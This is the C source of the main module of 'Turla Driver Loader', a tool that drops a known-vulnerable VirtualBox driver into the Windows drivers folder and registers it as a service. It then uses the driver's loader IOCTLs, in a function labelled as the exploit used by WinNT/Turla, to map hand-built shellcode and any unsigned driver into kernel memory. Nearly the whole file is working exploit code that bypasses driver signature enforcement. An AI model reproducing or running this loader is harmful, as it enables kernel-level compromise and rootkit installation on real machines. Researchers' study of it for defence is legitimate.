/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2019
*
*  TITLE:       MAIN.C
*
*  VERSION:     1.15
*
*  DATE:        19 Apr 2019
*
*  Furutaka entry point.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "vbox.h"
#include "shellcode.h"

#pragma data_seg("shrd")
volatile LONG g_lApplicationInstances = 0;
#pragma data_seg()
#pragma comment(linker, "/Section:shrd,RWS")

HINSTANCE  g_hInstance;
HANDLE     g_hVBox = INVALID_HANDLE_VALUE;
BOOL       g_VBoxInstalled = FALSE;

ULONG      g_NtBuildNumber = 0;

#define VBoxDrvSvc      TEXT("VBoxDrv")
#define supImageName    "furutaka"
#define supImageHandle  0x1a000

#define T_LOADERTITLE   TEXT("Turla Driver Loader v1.1.5 (19/04/19)")
#define T_LOADERUNSUP   TEXT("Unsupported WinNT version\r\n")
#define T_LOADERRUN     TEXT("Another instance running, close it before\r\n")
#define T_LOADERUSAGE   TEXT("Usage: loader DriverToLoad\n\re.g. loader mydrv.sys\r\n")
#define T_LOADERINTRO   TEXT("Turla Driver Loader v1.1.5 started\r\n(c) 2016 - 2019 TDL Project\r\nSupported x64 OS : 7 and above\r\n")
#define T_VBOXDETECT    TEXT("Ldr: Detected VirtualBox software installation, driver backup will be done")

/*
* TDLVBoxInstalled
*
* Purpose:
*
* Check VirtualBox software installation state.
*
*/
BOOL TDLVBoxInstalled(
    VOID
)
{
    BOOL     bPresent = FALSE;
    LRESULT  lRet;
    HKEY     hKey = NULL;

    lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Oracle\\VirtualBox"),
        0, KEY_READ, &hKey);

    bPresent = (hKey != NULL);

    if (hKey) {
        RegCloseKey(hKey);
    }

    return bPresent;
}

/*
* TDLGetProcAddress
*
* Purpose:
*
* Get NtOskrnl procedure address.
*
*/
ULONG_PTR TDLGetProcAddress(
    _In_ ULONG_PTR KernelBase,
    _In_ ULONG_PTR KernelImage,
    _In_ LPCSTR FunctionName
)
{
    ANSI_STRING    cStr;
    ULONG_PTR      pfn = 0;

    RtlInitString(&cStr, FunctionName);
    if (!NT_SUCCESS(LdrGetProcedureAddress((PVOID)KernelImage, &cStr, 0, (PVOID*)&pfn)))
        return 0;

    return KernelBase + (pfn - KernelImage);
}

/*
* TDLResolveKernelImport
*
* Purpose:
*
* Resolve import (ntoskrnl only).
*
*/
void TDLResolveKernelImport(
    _In_ ULONG_PTR Image,
    _In_ ULONG_PTR KernelImage,
    _In_ ULONG_PTR KernelBase
)
{
    PIMAGE_OPTIONAL_HEADER      popth;
    ULONG_PTR                   ITableVA, *nextthunk;
    PIMAGE_IMPORT_DESCRIPTOR    ITable;
    PIMAGE_THUNK_DATA           pthunk;
    PIMAGE_IMPORT_BY_NAME       pname;
    ULONG                       i;

    popth = &RtlImageNtHeader((PVOID)Image)->OptionalHeader;

    if (popth->NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_IMPORT)
        return;

    ITableVA = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (ITableVA == 0)
        return;

    ITable = (PIMAGE_IMPORT_DESCRIPTOR)(Image + ITableVA);

    if (ITable->OriginalFirstThunk == 0)
        pthunk = (PIMAGE_THUNK_DATA)(Image + ITable->FirstThunk);
    else
        pthunk = (PIMAGE_THUNK_DATA)(Image + ITable->OriginalFirstThunk);

    for (i = 0; pthunk->u1.Function != 0; i++, pthunk++) {
        nextthunk = (PULONG_PTR)(Image + ITable->FirstThunk);
        if ((pthunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) == 0) {
            pname = (PIMAGE_IMPORT_BY_NAME)((PCHAR)Image + pthunk->u1.AddressOfData);
            nextthunk[i] = TDLGetProcAddress(KernelBase, KernelImage, pname->Name);
        }
        else
            nextthunk[i] = TDLGetProcAddress(KernelBase, KernelImage, (LPCSTR)(pthunk->u1.Ordinal & 0xffff));
    }
}

/*
* TDLExploit
*
* Purpose:
*
* VirtualBox exploit used by WinNT/Turla.
*
*/
void TDLExploit(
    _In_ LPVOID Shellcode,
    _In_ ULONG CodeSize,
    _In_ ULONG DataOffset
)
{
    SUPCOOKIE       Cookie;
    SUPLDROPEN      OpenLdr;
    DWORD           bytesIO = 0;
    RTR0PTR         ImageBase = NULL;
    ULONG_PTR       paramOut;
    PSUPLDRLOAD     pLoadTask = NULL;
    SUPSETVMFORFAST vmFast;
    SUPLDRFREE      ldrFree;
    SIZE_T          memIO;
    WCHAR           text[256];

    while (g_hVBox != INVALID_HANDLE_VALUE) {
        RtlSecureZeroMemory(&Cookie, sizeof(SUPCOOKIE));
        Cookie.Hdr.u32Cookie = SUPCOOKIE_INITIAL_COOKIE;
        Cookie.Hdr.cbIn = SUP_IOCTL_COOKIE_SIZE_IN;
        Cookie.Hdr.cbOut = SUP_IOCTL_COOKIE_SIZE_OUT;
        Cookie.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
        Cookie.Hdr.rc = 0;
        Cookie.u.In.u32ReqVersion = 0;
        Cookie.u.In.u32MinVersion = 0x00070002;
        RtlCopyMemory(Cookie.u.In.szMagic, SUPCOOKIE_MAGIC, sizeof(SUPCOOKIE_MAGIC));

        if (!DeviceIoControl(g_hVBox, SUP_IOCTL_COOKIE,
            &Cookie, SUP_IOCTL_COOKIE_SIZE_IN, &Cookie,
            SUP_IOCTL_COOKIE_SIZE_OUT, &bytesIO, NULL))
        {
            cuiPrintText(TEXT("Ldr: SUP_IOCTL_COOKIE call failed"), TRUE);
            break;
        }

        RtlSecureZeroMemory(&OpenLdr, sizeof(OpenLdr));
        OpenLdr.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
        OpenLdr.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
        OpenLdr.Hdr.cbIn = SUP_IOCTL_LDR_OPEN_SIZE_IN;
        OpenLdr.Hdr.cbOut = SUP_IOCTL_LDR_OPEN_SIZE_OUT;
        OpenLdr.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
        OpenLdr.Hdr.rc = 0;
        OpenLdr.u.In.cbImage = CodeSize;
        RtlCopyMemory(OpenLdr.u.In.szName, supImageName, sizeof(supImageName));

        if (!DeviceIoControl(g_hVBox, SUP_IOCTL_LDR_OPEN, &OpenLdr,
            SUP_IOCTL_LDR_OPEN_SIZE_IN, &OpenLdr,
            SUP_IOCTL_LDR_OPEN_SIZE_OUT, &bytesIO, NULL))
        {
            cuiPrintText(TEXT("Ldr: SUP_IOCTL_LDR_OPEN call failed"), TRUE);
            break;
        }
        else {
            _strcpy(text, TEXT("Ldr: OpenLdr.u.Out.pvImageBase = 0x"));
            u64tohex((ULONG_PTR)OpenLdr.u.Out.pvImageBase, _strend(text));
            cuiPrintText(text, TRUE);
        }

        ImageBase = OpenLdr.u.Out.pvImageBase;

        memIO = PAGE_SIZE + CodeSize;
        NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*)&pLoadTask, 0, &memIO,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (pLoadTask == NULL)
            break;

        pLoadTask->Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
        pLoadTask->Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
        pLoadTask->Hdr.cbIn =
            (ULONG_PTR)(&((PSUPLDRLOAD)0)->u.In.achImage) + CodeSize;
        pLoadTask->Hdr.cbOut = SUP_IOCTL_LDR_LOAD_SIZE_OUT;
        pLoadTask->Hdr.fFlags = SUPREQHDR_FLAGS_MAGIC;
        pLoadTask->Hdr.rc = 0;
        pLoadTask->u.In.eEPType = SUPLDRLOADEP_VMMR0;
        pLoadTask->u.In.pvImageBase = ImageBase;
        pLoadTask->u.In.EP.VMMR0.pvVMMR0 = (RTR0PTR)supImageHandle;
        pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryEx = ImageBase;
        pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryFast = ImageBase;
        pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryInt = ImageBase;
        RtlCopyMemory(pLoadTask->u.In.achImage, Shellcode, CodeSize);
        pLoadTask->u.In.cbImage = CodeSize;

        if (!DeviceIoControl(g_hVBox, SUP_IOCTL_LDR_LOAD,
            pLoadTask, pLoadTask->Hdr.cbIn,
            pLoadTask, SUP_IOCTL_LDR_LOAD_SIZE_OUT, &bytesIO, NULL))
        {
            cuiPrintText(TEXT("Ldr: SUP_IOCTL_LDR_LOAD call failed"), TRUE);
            break;
        }
        else {
            _strcpy(text, TEXT("Ldr: SUP_IOCTL_LDR_LOAD, success\r\n\tShellcode mapped at 0x"));
            u64tohex((ULONG_PTR)ImageBase, _strend(text));
            _strcat(text, TEXT(", size = 0x"));
            ultohex(CodeSize, _strend(text));

            _strcat(text, TEXT("\r\n\tDriver image mapped at 0x"));
            u64tohex((ULONG_PTR)ImageBase + DataOffset, _strend(text));
            cuiPrintText(text, TRUE);
        }

        RtlSecureZeroMemory(&vmFast, sizeof(vmFast));
        vmFast.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
        vmFast.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
        vmFast.Hdr.rc = 0;
        vmFast.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
        vmFast.Hdr.cbIn = SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN;
        vmFast.Hdr.cbOut = SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT;
        vmFast.u.In.pVMR0 = (LPVOID)supImageHandle;

        if (!DeviceIoControl(g_hVBox, SUP_IOCTL_SET_VM_FOR_FAST,
            &vmFast, SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN,
            &vmFast, SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT, &bytesIO, NULL))
        {
            cuiPrintText(TEXT("Ldr: SUP_IOCTL_SET_VM_FOR_FAST call failed"), TRUE);
            break;
        }
        else {
            cuiPrintText(TEXT("Ldr: SUP_IOCTL_SET_VM_FOR_FAST call complete"), TRUE);
        }

        cuiPrintText(TEXT("Ldr: SUP_IOCTL_FAST_DO_NOP"), TRUE);

        paramOut = 0;
        DeviceIoControl(g_hVBox, SUP_IOCTL_FAST_DO_NOP,
            NULL, 0,
            &paramOut, sizeof(paramOut), &bytesIO, NULL);

        cuiPrintText(TEXT("Ldr: SUP_IOCTL_LDR_FREE"), TRUE);

        RtlSecureZeroMemory(&ldrFree, sizeof(ldrFree));
        ldrFree.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
        ldrFree.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
        ldrFree.Hdr.cbIn = SUP_IOCTL_LDR_FREE_SIZE_IN;
        ldrFree.Hdr.cbOut = SUP_IOCTL_LDR_FREE_SIZE_OUT;
        ldrFree.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
        ldrFree.Hdr.rc = 0;
        ldrFree.u.In.pvImageBase = ImageBase;

        DeviceIoControl(g_hVBox, SUP_IOCTL_LDR_FREE,
            &ldrFree, SUP_IOCTL_LDR_FREE_SIZE_IN,
            &ldrFree, SUP_IOCTL_LDR_FREE_SIZE_OUT, &bytesIO, NULL);

        break;
    }

    if (pLoadTask != NULL) {
        memIO = 0;
        NtFreeVirtualMemory(NtCurrentProcess(), (PVOID*)&pLoadTask, &memIO, MEM_RELEASE);
    }

    if (g_hVBox != INVALID_HANDLE_VALUE) {
        CloseHandle(g_hVBox);
        g_hVBox = INVALID_HANDLE_VALUE;
    }
}

/*
* TDLMapDriver
*
* Purpose:
*
* Build shellcode and execute exploit.
*
*/
UINT TDLMapDriver(
    _In_ LPWSTR lpDriverFullName
)
{
    UINT               result = (UINT)-1;
    ULONG              DllCharacteristics = IMAGE_FILE_EXECUTABLE_IMAGE;
    ULONG              isz, prologueSize, dataOffset;
    SIZE_T             memIO;
    ULONG_PTR          KernelBase, KernelImage = 0;
    ULONG_PTR          xExAllocatePoolWithTag = 0, xPsCreateSystemThread = 0, xZwClose = 0;
    HMODULE            Image = NULL;
    PIMAGE_NT_HEADERS  FileHeader;
    PBYTE              Buffer = NULL;
    UNICODE_STRING     uStr;
    ANSI_STRING        routineName;
    NTSTATUS           status;
    WCHAR              text[256];

    KernelBase = supGetNtOsBase();
    while (KernelBase != 0) {

        _strcpy(text, TEXT("Ldr: Kernel base = 0x"));
        u64tohex(KernelBase, _strend(text));
        cuiPrintText(text, TRUE);

        RtlSecureZeroMemory(&uStr, sizeof(uStr));
        RtlInitUnicodeString(&uStr, lpDriverFullName);
        status = LdrLoadDll(NULL, &DllCharacteristics, &uStr, (PVOID*)&Image);
        if ((!NT_SUCCESS(status)) || (Image == NULL)) {
            cuiPrintText(TEXT("Ldr: Error while loading input driver file"), TRUE);
            break;
        }
        else {
            _strcpy(text, TEXT("Ldr: Input driver file loaded at 0x"));
            u64tohex((ULONG_PTR)Image, _strend(text));
            cuiPrintText(text, TRUE);
        }

        FileHeader = RtlImageNtHeader(Image);
        if (FileHeader == NULL)
            break;

        isz = FileHeader->OptionalHeader.SizeOfImage;

        cuiPrintText(TEXT("Ldr: Loading ntoskrnl.exe"), TRUE);

        RtlInitUnicodeString(&uStr, L"ntoskrnl.exe");
        status = LdrLoadDll(NULL, NULL, &uStr, (PVOID*)&KernelImage);
        if ((!NT_SUCCESS(status)) || (KernelImage == 0)) {
            cuiPrintText(TEXT("Ldr: Error while loading ntoskrnl.exe"), TRUE);
            break;
        }
        else {
            _strcpy(text, TEXT("Ldr: ntoskrnl.exe loaded at 0x"));
            u64tohex(KernelImage, _strend(text));
            cuiPrintText(text, TRUE);
        }

        RtlInitString(&routineName, "ExAllocatePoolWithTag");
        status = LdrGetProcedureAddress((PVOID)KernelImage, &routineName, 0, (PVOID*)&xExAllocatePoolWithTag);
        if ((!NT_SUCCESS(status)) || (xExAllocatePoolWithTag == 0)) {
            cuiPrintText(TEXT("Ldr: Error, ExAllocatePoolWithTag address not found"), TRUE);
            break;
        }
        else {
            _strcpy(text, TEXT("Ldr: ExAllocatePoolWithTag 0x"));
            u64tohex(KernelBase + (xExAllocatePoolWithTag - KernelImage), _strend(text));
            cuiPrintText(text, TRUE);
        }

        if (g_NtBuildNumber < 15063) {
            RtlInitString(&routineName, "PsCreateSystemThread");
            status = LdrGetProcedureAddress((PVOID)KernelImage, &routineName, 0, (PVOID*)&xPsCreateSystemThread);
            if ((!NT_SUCCESS(status)) || (xPsCreateSystemThread == 0)) {
                cuiPrintText(TEXT("Ldr: Error, PsCreateSystemThread address not found"), TRUE);
                break;
            }
            else {
                _strcpy(text, TEXT("Ldr: PsCreateSystemThread 0x"));
                u64tohex(KernelBase + (xPsCreateSystemThread - KernelImage), _strend(text));
                cuiPrintText(text, TRUE);
            }

            RtlInitString(&routineName, "ZwClose");
            status = LdrGetProcedureAddress((PVOID)KernelImage, &routineName, 0, (PVOID*)&xZwClose);
            if ((!NT_SUCCESS(status)) || (xZwClose == 0)) {
                cuiPrintText(TEXT("Ldr: Error, ZwClose address not found"), TRUE);
                break;
            }
            else {
                _strcpy(text, TEXT("Ldr: ZwClose 0x"));
                u64tohex(KernelBase + (xZwClose - KernelImage), _strend(text));
                cuiPrintText(text, TRUE);
            }
        }

        memIO = isz + PAGE_SIZE;
        NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*)&Buffer, 0, &memIO,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (Buffer == NULL) {
            cuiPrintText(TEXT("Ldr: Error, unable to allocate shellcode"), TRUE);
            break;
        }
        else {
            _strcpy(text, TEXT("Ldr: Shellcode allocated at 0x"));
            u64tohex((ULONG_PTR)Buffer, _strend(text));
            cuiPrintText(text, TRUE);
        }

        // mov rcx, ExAllocatePoolWithTag
        // mov rdx, PsCreateSystemThread
        // mov r8, ZwClose

        Buffer[0x00] = 0x48; // mov rcx, xxxxx
        Buffer[0x01] = 0xb9;
        *((PULONG_PTR)&Buffer[2]) =
            KernelBase + (xExAllocatePoolWithTag - KernelImage);

        if (g_NtBuildNumber < 15063) {
            Buffer[0x0a] = 0x48; // mov rdx, xxxxx
            Buffer[0x0b] = 0xba;
            *((PULONG_PTR)&Buffer[0x0c]) =
                KernelBase + (xPsCreateSystemThread - KernelImage);
            Buffer[0x14] = 0x49; //mov r8, xxxxx
            Buffer[0x15] = 0xb8;
            *((PULONG_PTR)&Buffer[0x16]) =
                KernelBase + (xZwClose - KernelImage);

            prologueSize = 0x1e;
        }
        else {
            prologueSize = 0x0a;
        }

        dataOffset = prologueSize + MAX_SHELLCODE_LENGTH;

        if (g_NtBuildNumber < 15063) {
            RtlCopyMemory(Buffer + prologueSize,
                TDLBootstrapLoader_code, sizeof(TDLBootstrapLoader_code));
            cuiPrintText(TEXT("Ldr: Default bootstrap shellcode selected"), TRUE);
        }
        else {
            RtlCopyMemory(Buffer + prologueSize,
                TDLBootstrapLoader_code_w10rs2, sizeof(TDLBootstrapLoader_code_w10rs2));
            cuiPrintText(TEXT("Ldr: Windows 10 RS2+ bootstrap shellcode selected"), TRUE);
        }

        RtlCopyMemory(Buffer + dataOffset, Image, isz);

        cuiPrintText(TEXT("Ldr: Resolving kernel import"), TRUE);
        TDLResolveKernelImport((ULONG_PTR)Buffer + dataOffset, KernelImage, KernelBase);

        cuiPrintText(TEXT("Ldr: Executing exploit"), TRUE);
        TDLExploit(Buffer, isz + PAGE_SIZE, dataOffset);
        result = 0;
        break;
    }

    if (Buffer != NULL) {
        memIO = 0;
        NtFreeVirtualMemory(NtCurrentProcess(), (PVOID*)&Buffer, &memIO, MEM_RELEASE);
    }

    return result;
}

#define VBOXNETADP_SVC L"VBoxNetAdp"
#define VBOXNETLWF_SVC L"VBoxNetLwf"
#define VBOXUSBMON_SVC L"VBoxUSBMon"

/*
* TDLStartVulnerableDriver
*
* Purpose:
*
* Load vulnerable virtualbox driver and return handle for it device.
*
*/
HANDLE TDLStartVulnerableDriver(
    VOID
)
{
    PBYTE       DrvBuffer;
    ULONG       DataSize = 0, bytesIO;
    HANDLE      hDevice = INVALID_HANDLE_VALUE;
    SC_HANDLE   schSCManager = NULL;
    LPWSTR      msg;

    WCHAR       szDriverFileName[MAX_PATH * 2];

    DrvBuffer = supQueryResourceData(1, g_hInstance, &DataSize);
    if (DrvBuffer == NULL)
        return INVALID_HANDLE_VALUE;

    do {

        //lets give scm nice looking path so this piece of shit code from early 90x wont fuckup somewhere.
        RtlSecureZeroMemory(szDriverFileName, sizeof(szDriverFileName));
        if (!GetSystemDirectory(szDriverFileName, MAX_PATH)) {
            cuiPrintText(TEXT("Ldr: Error loading VirtualBox driver, GetSystemDirectory failed"), TRUE);
            break;
        }

        schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
        if (schSCManager == NULL) {
            cuiPrintText(TEXT("Ldr: Error opening SCM database"), TRUE);
            break;
        }

        //
        // Lookup main vbox driver device, if found, try to unload all possible, unload order is sensitive
        //
        if (supIsObjectExists(L"\\Device", VBoxDrvSvc)) {

            cuiPrintText(TEXT("Ldr: Active VirtualBox found in system, attempt stop (unload) it drivers"), TRUE);

            if (!supStopVBoxService(schSCManager, VBOXUSBMON_SVC)) {
                cuiPrintText(TEXT("SCM: Error stopping VBoxUSBMon, cannot continue"), TRUE);
                break;
            }

            if (!supStopVBoxService(schSCManager, VBOXNETADP_SVC)) {
                cuiPrintText(TEXT("SCM: Error stopping VBoxNetAdp, cannot continue"), TRUE);
                break;
            }

            if (!supStopVBoxService(schSCManager, VBOXNETLWF_SVC)) {
                cuiPrintText(TEXT("SCM: Error stopping VBoxNetLwf, cannot continue"), TRUE);
                break;
            }

            Sleep(1000);

            if (!supStopVBoxService(schSCManager, VBoxDrvSvc)) {
                cuiPrintText(TEXT("SCM: Error stopping VBoxDrv, cannot continue"), TRUE);
                break;
            }

        }

        //
        // If vbox installed backup it driver, do it before dropping our
        // Ignore error if file not found
        //
        if (g_VBoxInstalled) {
            if (supBackupVBoxDrv(FALSE) == FALSE) {
                cuiPrintText(TEXT("Ldr: Error while doing VirtualBox driver backup"), TRUE);
            }
            else {
                cuiPrintText(TEXT("Ldr: VirtualBox driver backup done"), TRUE);
            }
        }

        //drop our vboxdrv version
        _strcat(szDriverFileName, TEXT("\\drivers\\VBoxDrv.sys"));
        bytesIO = (ULONG)supWriteBufferToFile(szDriverFileName, DrvBuffer,
            (SIZE_T)DataSize, FALSE, FALSE);

        if (bytesIO != DataSize) {
            cuiPrintText(TEXT("Ldr: Error writing VirtualBox on disk"), TRUE);
            break;
        }

        //if vbox not found in system install driver in scm
        if (g_VBoxInstalled == FALSE) {
            scmInstallDriver(schSCManager, VBoxDrvSvc, szDriverFileName);
        }

        //run driver
        if (scmStartDriver(schSCManager, VBoxDrvSvc) != FALSE) {

            if (scmOpenDevice(VBoxDrvSvc, &hDevice))
                msg = TEXT("SCM: Vulnerable driver loaded and opened");
            else
                msg = TEXT("SCM: Driver device open failure");

        }
        else {
            msg = TEXT("SCM: Vulnerable driver load failure");
        }

        cuiPrintText(msg, TRUE);

    } while (FALSE);

    //post cleanup
    if (schSCManager != NULL) {
        CloseServiceHandle(schSCManager);
    }
    return hDevice;
}

/*
* TDLStopVulnerableDriver
*
* Purpose:
*
* Unload previously loaded vulnerable driver. If VirtualBox installed - restore original driver.
*
*/
void TDLStopVulnerableDriver(
    VOID
)
{
    SC_HANDLE	       schSCManager;
    LPWSTR             msg;
    UNICODE_STRING     uStr;
    OBJECT_ATTRIBUTES  ObjectAttributes;

    cuiPrintText(TEXT("SCM: Unloading vulnerable driver"), TRUE);

    if (g_hVBox != INVALID_HANDLE_VALUE)
        CloseHandle(g_hVBox);

    schSCManager = OpenSCManager(NULL,
        NULL,
        SC_MANAGER_ALL_ACCESS
    );

    if (schSCManager == NULL) {
        cuiPrintText(TEXT("SCM: Cannot open database, unable unload driver"), TRUE);
        return;
    }

    //stop driver in any case
    if (scmStopDriver(schSCManager, VBoxDrvSvc))
        msg = TEXT("SCM: Vulnerable driver successfully unloaded");
    else
        msg = TEXT("SCM: Unexpected error while unloading driver");

    cuiPrintText(msg, TRUE);

    //if VBox not installed - remove from scm database and delete file
    if (g_VBoxInstalled == FALSE) {

        if (scmRemoveDriver(schSCManager, VBoxDrvSvc))
            msg = TEXT("SCM: Driver entry removed from registry");
        else
            msg = TEXT("SCM: Error removing driver entry from registry");

        cuiPrintText(msg, TRUE);

        uStr.Buffer = NULL;
        uStr.Length = 0;
        uStr.MaximumLength = 0;
        RtlInitUnicodeString(&uStr, L"\\??\\globalroot\\systemroot\\system32\\drivers\\VBoxDrv.sys");
        InitializeObjectAttributes(&ObjectAttributes, &uStr, OBJ_CASE_INSENSITIVE, NULL, NULL);
        if (NT_SUCCESS(NtDeleteFile(&ObjectAttributes)))
            msg = TEXT("Ldr: Driver file removed");
        else
            msg = TEXT("Ldr: Error removing driver file");

        cuiPrintText(msg, TRUE);

    }
    else {
        //VBox software present, restore original driver and exit
        if (supBackupVBoxDrv(TRUE))
            msg = TEXT("Ldr: Original VirtualBox driver restored from backup");
        else
            msg = TEXT("Ldr: Unexpected error while restoring original driver from backup");

        cuiPrintText(msg, TRUE);
    }
    CloseServiceHandle(schSCManager);
}

/*
* TDLProcessCommandLine
*
* Purpose:
*
* Extract target driver from command line and continue with it load.
*
*/
UINT TDLProcessCommandLine(
    _In_ LPWSTR lpCommandLine
)
{
    UINT   retVal = (UINT)-1;
    WCHAR  szInputFile[MAX_PATH + 1];
    ULONG  c;

    //input file
    c = 0;
    RtlSecureZeroMemory(szInputFile, sizeof(szInputFile));
    GetCommandLineParam(lpCommandLine, 1, (LPWSTR)&szInputFile, MAX_PATH, &c);
    if (c == 0) {
        cuiPrintText(T_LOADERUSAGE, FALSE);
        return retVal;
    }

    if (PathFileExists(szInputFile)) {
        g_hVBox = TDLStartVulnerableDriver();
        if (g_hVBox != INVALID_HANDLE_VALUE) {
            retVal = TDLMapDriver(szInputFile);
            TDLStopVulnerableDriver();
        }
    }
    else {
        cuiPrintText(TEXT("Ldr: Input file not found"), FALSE);
    }
    return retVal;
}

/*
* TDLMain
*
* Purpose:
*
* Loader main.
*
*/
void TDLMain()
{

    UINT            uResult = 0;
    LONG            x;
    OSVERSIONINFO   osv;
    WCHAR           text[256];

    do {

        g_hInstance = GetModuleHandle(NULL);

        cuiInitialize(FALSE, NULL);

        SetConsoleTitle(T_LOADERTITLE);

        cuiPrintText(T_LOADERINTRO, TRUE);

        x = InterlockedIncrement((PLONG)&g_lApplicationInstances);
        if (x > 1) {
            cuiPrintText(T_LOADERRUN, FALSE);
            uResult = (UINT)-1;
            break;
        }

        //check version first
        RtlSecureZeroMemory(&osv, sizeof(osv));
        osv.dwOSVersionInfoSize = sizeof(osv);
        RtlGetVersion((PRTL_OSVERSIONINFOW)&osv);
        if (osv.dwMajorVersion < 6) {
            cuiPrintText(T_LOADERUNSUP, FALSE);
            uResult = (UINT)-1;
            break;
        }

        g_NtBuildNumber = osv.dwBuildNumber;

        _strcpy(text, TEXT("Ldr: Windows v"));
        ultostr(osv.dwMajorVersion, _strend(text));
        _strcat(text, TEXT("."));
        ultostr(osv.dwMinorVersion, _strend(text));
        _strcat(text, TEXT(" build "));
        ultostr(osv.dwBuildNumber, _strend(text));
        cuiPrintText(text, TRUE);

        //
        // If VirtualBox installed on the same machine warn user,
        // however this is unnecessary can lead to any conflicts.
        //
        g_VBoxInstalled = TDLVBoxInstalled();
        if (g_VBoxInstalled) {
            cuiPrintText(T_VBOXDETECT, TRUE);
        }

        uResult = TDLProcessCommandLine(GetCommandLine());

    } while (FALSE);

    InterlockedDecrement((PLONG)&g_lApplicationInstances);
    ExitProcess(uResult);
}
